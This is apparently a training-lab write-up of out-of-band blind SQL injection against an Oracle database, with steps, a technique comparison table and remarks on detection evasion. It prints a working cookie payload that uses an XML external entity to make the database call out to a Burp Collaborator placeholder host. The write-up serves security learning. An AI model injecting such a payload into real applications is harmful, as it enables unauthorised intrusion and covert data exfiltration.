# Lab 16 — Blind SQL Injection with Out-of-Band Interaction

**Difficulty:** Expert
**Technique:** Out-of-band SQLi — DNS exfiltration channel
**Lab URL:** https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

---

## Vulnerability

The application is vulnerable to blind SQL injection via a tracking cookie. This lab covers out-of-band (OOB) techniques — where the attack result is delivered through a completely separate channel (DNS) rather than the application's own response. OOB is used when in-band techniques are blocked or unreliable.

---

## Steps Taken

1. Confirmed the injection point via the tracking cookie
2. Identified the database as Oracle
3. Used Burp Collaborator to generate a unique external URL for DNS callback detection
4. Injected a payload causing the Oracle database to make a DNS lookup to the Collaborator URL
5. Observed the DNS interaction arrive at the Collaborator server — confirming blind OOB SQLi

---

## Payload Used (Oracle)

```
TrackingId=xyz'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-URL/"> %remote;]>'),'/l')+FROM+dual--
```

**What this does:**
- Uses Oracle's XML processing to trigger an external DNS/HTTP request
- The database server makes a DNS lookup to the Burp Collaborator URL
- Interaction appears in Collaborator — confirming successful OOB channel
- Nothing visible in the application response

---

## When to Use OOB

| Technique | Works when |
|-----------|-----------|
| UNION-based | Output visible in response |
| Conditional responses | Page behaviour changes |
| Time-based | Response timing measurable |
| Out-of-band | None of the above work |

---

## Real-World Impact

OOB bypasses all application-level filtering because data leaves through a completely different channel. WAFs and IDS systems focused on HTTP responses miss DNS-based exfiltration entirely. This makes OOB SQLi particularly dangerous in high-security environments.

---

## Key Takeaway

SQL injection has four exploitation channels. OOB is the final fallback — the most powerful and hardest to detect. Tools like Burp Collaborator make OOB interaction detection practical in professional assessments.
